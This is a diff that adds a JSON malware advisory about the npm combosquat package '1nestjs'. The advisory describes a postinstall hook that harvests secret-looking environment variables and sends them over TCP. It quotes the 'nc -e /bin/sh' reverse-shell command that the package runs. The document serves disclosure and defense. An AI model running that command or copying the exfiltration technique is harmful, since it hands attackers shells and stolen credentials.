@@ -1,0 +1,58 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-11880",
+  "modified": "2026-09-03T22:52:06Z",
+  "published": "2026-09-03T22:51:47Z",
+  "summary": "Malicious code in 1nestjs (npm)",
+  "details": "The package's postinstall hook executes index.js, which collects every environment variable whose name matches SECRET, API, TOKEN, or KEY and sends them over a TCP connection to a host:port read from servers.json (default 127[.]0[.]0[.]1:9999, overridable via TS_HOST/TS_PORT). It then runs `nc -e /bin/sh \u003chost\u003e \u003cport\u003e` to open a reverse shell to the same endpoint. The package name is a combosquat of the legitimate nestjs framework.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "1nestjs",
+        "purl": "pkg:npm/1nestjs"
+      },
+      "versions": [
+        "0.0.1"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/1nestjs/v/0.0.1"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-11880"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-09-03T22:51:47Z",
+      "indicators_observed": {
+        "sha256": [
+          "c4918d19853b3a27781f35eccfb6b15ce0c342a2db944bd320bee222f787e4ca"
+        ]
+      }
+    }
+  }
+}
